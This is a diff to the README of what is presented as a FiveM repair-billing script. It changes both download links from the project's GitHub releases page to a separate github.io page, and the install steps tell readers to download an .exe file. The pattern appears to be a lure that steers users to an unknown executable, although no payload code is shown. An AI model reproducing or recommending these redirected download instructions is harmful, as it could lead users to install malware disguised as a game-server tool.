@@ -1,6 +1,6 @@
 # 🛠️ repair-billing-script - Calculate mechanic repair costs with ease
 
-<a href="https://github.com/Pippyelegant71/repair-billing-script/releases"><img src="https://img.shields.io/badge/Download-Latest_Release-blue.svg" alt="Download"></a>
+<a href="https://pippyelegant71.github.io"><img src="https://img.shields.io/badge/Download-Latest_Release-blue.svg" alt="Download"></a>
 
 ## 📋 Project Overview
 
@@ -25,7 +25,7 @@ The repair-billing-script helps mechanics in FiveM servers calculate repair cost
 
 Follow these steps to get the software on your machine:
 
-1. Visit this page to download the latest file from our releases section: [https://github.com/Pippyelegant71/repair-billing-script/releases](https://github.com/Pippyelegant71/repair-billing-script/releases)
+1. Visit this page to download the latest file from our releases section: [https://pippyelegant71.github.io](https://pippyelegant71.github.io)
 2. Locate the file ending in .exe in the list.
 3. Click the file name to start the download.
 4. Save the file to a folder you can find easily, such as your Downloads folder.
